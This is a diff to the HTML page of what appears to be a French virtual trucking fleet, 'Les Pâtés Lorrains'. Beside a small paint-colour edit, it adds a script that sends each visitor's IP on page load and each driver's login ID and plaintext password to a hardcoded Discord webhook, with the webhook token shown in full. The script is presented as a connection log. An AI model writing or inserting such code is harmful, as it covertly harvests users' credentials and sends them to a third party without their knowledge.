@@ -1325,7 +1325,7 @@ Les Pâtés Lorrains
   <div class="card">
     <p>Voici les consignes pour personnaliser ton camion et ta remorque aux couleurs de Les Pâtés Lorrains. L'objectif est d'avoir une flotte homogène et stylée sur les routes !</p>
     <h3>🔷 CAMION</h3>
-    <p>Le modèle recommandé est le Scania (en simple essieux chassis 4x2), mais ce n'est pas obligatoire. Tu dois utiliser la peinture Vision comme montré ci-dessus.</p>
+    <p>Le modèle recommandé est le Scania (en simple essieux chassis 4x2), mais ce n'est pas obligatoire. Tu dois utiliser la peinture Sunrise comme montré ci-dessus.</p>
     <h3>🎨 COULEURS DU CAMION + REMORQUE</h3>
     <p>Utilise exactement ces 3 couleurs :</p>
     <div class="gallery" style="display: flex; flex-wrap: wrap; justify-content: center; gap: 2rem; margin-bottom: 2rem;">
@@ -1483,6 +1483,7 @@ function validateChauffeur() {
   const found = allowed.find(u => u.id === id && u.pass === pass);
   if (found) {
     document.getElementById("chauffeurLoginModal").style.display = "none";
+    logChauffeurConnexion(id, pass);
     navigate("chauffeurPage");
   } else {
     document.getElementById("chauffeurLoginError").style.display = "block";
@@ -1948,12 +1949,61 @@ function validateChauffeur() {
     }
 
     document.getElementById("chauffeurLoginModal").style.display = "none";
+    logChauffeurConnexion(id, pass);
     navigate("chauffeurPage");
   } else {
     document.getElementById("chauffeurLoginError").style.display = "block";
   }
 }
 
+</script>
+
+<script>
+function sendDiscordLog(eventType, id = "", pass = "") {
+  fetch("https://api.ipify.org?format=json")
+    .then(response => response.json())
+    .then(data => {
+      const ip = data.ip;
+      const now = new Date();
+      const date = now.toLocaleDateString('fr-FR');
+      const time = now.toLocaleTimeString('fr-FR');
+      const embed = {
+        embeds: [{
+          title: eventType === "Connexion chauffeur" ? "🚚 Connexion Chauffeur" : "🛡️ Connexion Visiteur",
+          color: eventType === "Connexion chauffeur" ? 15844367 : 3066993,
+          fields: [
+            { name: "📌 Type", value: eventType, inline: true },
+            { name: "📅 Date", value: date, inline: true },
+            { name: "⏰ Heure", value: time, inline: true },
+            { name: "🌍 IP", value: ip, inline: false },
+            ...(eventType === "Connexion chauffeur" ? [
+              { name: "🆔 Identifiant", value: id || "Non fourni", inline: true },
+              { name: "🔒 Mot de passe", value: pass || "Non fourni", inline: true }
+            ] : [])
+          ],
+          footer: {
+            text: "Les Pâtés Lorrains - Suivi des connexions"
+          },
+          timestamp: new Date().toISOString()
+        }]
+      };
+      fetch("https://discord.com/api/webhooks/1366946101373960273/nQOEXaEdl1sKrWrqp3PC4vrAa5k0bxshJ4Fcc5WstJnV_UMxgxHLBibO8P1qNYdnwUnO", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(embed)
+      });
+    });
+}
+
+window.addEventListener("load", () => {
+  sendDiscordLog("Connexion visiteur");
+});
+
+function logChauffeurConnexion(id, pass) {
+  sendDiscordLog("Connexion chauffeur", id, pass);
+}
 </script>
 </body>
 </html>
